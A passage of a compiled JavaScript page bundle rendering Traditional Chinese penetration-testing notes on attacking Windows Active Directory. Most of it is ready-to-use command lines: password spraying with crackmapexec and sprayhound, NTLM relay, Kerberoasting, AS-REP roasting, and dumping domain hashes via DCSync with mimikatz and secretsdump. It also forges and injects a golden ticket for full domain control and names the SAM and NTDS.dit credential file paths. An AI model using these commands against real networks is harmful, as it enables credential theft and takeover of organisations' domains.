password"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"cme {protocol} {target(s)} -u <usernames_lists> -p <passwords_lists>"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce"})}),"\n",(0,i.jsxs)(n.li,{children:["ex: smb \u5bc6\u78bc\u5674\u7051","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"crackmapexec smb <ip> -u <Usernames.txt> -p '<password>'"})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["sprayhound\n",(0,i.jsx)(n.code,{children:"sprayhound -U users.txt -d <domain> -dc <dc_ip> --lower"})]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"ntlm-relay",children:"NTLM Relay"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Hunting unsigned smb\uff1a",(0,i.jsx)(n.code,{children:"crackmapexec smb <ip_or_ip_range> --gen-relay-list relay.txt"})]}),"\n",(0,i.jsxs)(n.li,{children:["tool: ",(0,i.jsx)(n.code,{children:"ntlmrelayx"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"davrelayup-1",children:"DavRelayUp"}),"\n",(0,i.jsx)(n.h3,{id:"kerberoasting",children:"Kerberoasting"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Recon\uff1a",(0,i.jsx)(n.code,{children:"crackmapexec smb {ip} --users (smb username)"})]}),"\n",(0,i.jsxs)(n.li,{children:["exploit\uff1a",(0,i.jsx)(n.code,{children:"impacket-GetUserSPNs {domain}\\{name}:{[password]} -dc-ip {dc-ip} -request -outputfile hash"})]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"dcsync",children:"DcSync"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://www.modb.pro/db/108846",children:"https://www.modb.pro/db/108846"})}),"\n"]}),"\n",(0,i.jsx)(n.admonition,{type:"info",children:(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u672c\u5730\u5740\u7528\u8005\u8cc7\u6599\u5eab C:\\windows\\system32\\config\\SAM","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u898b ",(0,i.jsx)(n.strong,{children:"Windows \u5f8c\u6ef2\u900f"})]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\u7db2\u57df\u4f7f\u7528\u8005\u8cc7\u6599\u5eab C:\\Windows\\NTDS\\NTDS.dit","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"DcSync"})," \u5c31\u662f\u628a ",(0,i.jsx)(n.strong,{children:"NTDS.dit"})," \u7684\u8cc7\u6599\u5c0e\u51fa\u4f86"]}),"\n"]}),"\n"]}),"\n"]})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u6709 ",(0,i.jsx)(n.strong,{children:"Domain Admin"})," \u6b0a\u9650 \u6216 \u5177\u6709",(0,i.jsx)(n.code,{children:"Replicating Directory Changes"})," \u6216 ",(0,i.jsx)(n.code,{children:"Replicating Directory Changes All"})," \u624d\u80fd\u61c9\u7528\u6b64\u653b\u64ca (\u64c1\u6709 Administrators\u3001Domain Controllers \u6216 Enterprise Domain Admins \u7fa4\u7d44\u5167\u7684\u4f7f\u7528\u8005\u6b0a\u9650)"]}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"dumping-hash",children:"Dumping Hash"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["cme\uff1a",(0,i.jsx)(n.code,{children:"crackmapexec smb <dc_ip> -H <hash> -d <domain> -u <username> --ntds"})]}),"\n",(0,i.jsxs)(n.li,{children:["Mimikatz","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5207\u5230 Domain Admin \u5e33\u6236 (\u6703\u5f48\u51fa\u65b0\u7684 cmd \u8996\u7a97)","\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"privilege::debug"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm>"})}),"\n",(0,i.jsxs)(n.li,{children:["\u518d\u555f\u7528\u5f8c\uff1a",(0,i.jsx)(n.code,{children:"lsadump::dcsync /all"})]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["secretsdump","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"python3 secretsdump.py <Domain>/administrator:<Domiain_admin_password>@<ip> -dc-ip <dc_ip> -just-dc-user administrator"})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h4,{id:"generating-golden-ticket",children:"Generating Golden ticket"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Golden Ticket \u662f\u4e00\u7a2e\u7279\u6b0a Kerberos TGT\uff08Ticket Granting Ticket\uff09\uff0c\u5141\u8a31\u653b\u64ca\u8005\u5047\u5192\u57df\u5167\u7684\u4efb\u4f55\u7528\u6236\uff0c\u4e26\u5728\u57df\u5167\u64c1\u6709\u6700\u9ad8\u6b0a\u9650\u3002"}),"\n",(0,i.jsx)(n.li,{children:"\u900f\u904e\u4e0a\u8ff0 Dumping Hash \u653b\u64ca\u7372\u5f97 (krbtgt\u7684) NTLM hash \u4e4b\u5f8c\uff0c\u63a5\u8457\u53ef\u4ee5\u88fd\u4f5c Golden Ticket"}),"\n",(0,i.jsxs)(n.li,{children:["mimikatz\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"lsadump::dcsync /domain:<domain> /user:krbtgt"})}),"\n",(0,i.jsxs)(n.li,{children:["\u751f\u6210\uff1a",(0,i.jsx)(n.code,{children:"sekurlsa::pth /user:administrator /domain:example.com /ntlm:KRBTGT_NTLM_HASH /sid:S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXX /target:example.com /groups:513 /ticket:golden.kirbi"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u6ce8\u5165 Golden Ticket\uff1a",(0,i.jsx)(n.code,{children:"kerberos::ptt golden.kirbi"})]}),"\n",(0,i.jsx)(n.li,{children:"\u6210\u529f\u62ff\u4e0b\u6700\u9ad8\u6b0a\u9650"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"as-rep-roasting",children:"AS-REP Roasting"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.code,{children:"GetNPUsers.py <Domain>/ -no-pass -usersfile <users_file>"})}),"\n"]})]})}function t(e={}){const{wrapper:n}={...(0,l.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>c,a:()=>d});var i=s(7294);const l={},r=i.createContext(l);function d(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:d(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);